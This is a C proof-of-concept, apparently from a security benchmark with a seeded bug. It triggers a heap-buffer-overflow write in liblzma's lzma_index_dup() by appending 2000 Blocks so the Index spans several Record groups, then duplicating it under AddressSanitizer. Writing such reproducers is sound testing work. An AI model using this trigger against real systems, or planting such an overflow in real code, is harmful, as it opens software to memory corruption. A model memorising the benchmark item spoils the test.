// PoC: heap-buffer-overflow in lzma_index_dup() for a multi-group Index.
//
// Builds a valid single-Stream Index that contains more Blocks than fit in
// one internal Record group (INDEX_GROUP_SIZE == 512), then duplicates it
// with the public lzma_index_dup() API. On the shipped tree the Record copy
// in index_dup_stream() writes past the end of the destination group.
//
// Build (links against liblzma.a built with -fsanitize=address):
//   cc -I src/liblzma/api -fsanitize=address -g poc residual.c liblzma.a -lpthread
//
// Exit: aborts under ASan (heap-buffer-overflow WRITE) on the shipped tree;
// returns 0 cleanly on the golden tree.

#include <lzma.h>
#include <stdio.h>
#include <stdlib.h>

int
main(void)
{
	lzma_index *idx = lzma_index_init(NULL);
	if (idx == NULL) {
		fprintf(stderr, "lzma_index_init failed\n");
		return 1;
	}

	// Append enough Blocks to require several Record groups. Each group
	// holds up to 512 Records, so 2000 Blocks span four groups.
	for (unsigned i = 0; i < 2000; ++i) {
		lzma_ret ret = lzma_index_append(idx, NULL,
				LZMA_VLI_C(0x1000), LZMA_VLI_C(0x1000));
		if (ret != LZMA_OK) {
			fprintf(stderr, "append %u failed: %d\n", i, ret);
			return 1;
		}
	}

	lzma_index *copy = lzma_index_dup(idx, NULL);
	if (copy == NULL) {
		fprintf(stderr, "lzma_index_dup failed\n");
		return 1;
	}

	printf("blocks=%llu checks=%#x\n",
			(unsigned long long)lzma_index_block_count(copy),
			lzma_index_checks(copy));

	lzma_index_end(copy, NULL);
	lzma_index_end(idx, NULL);
	return 0;
}
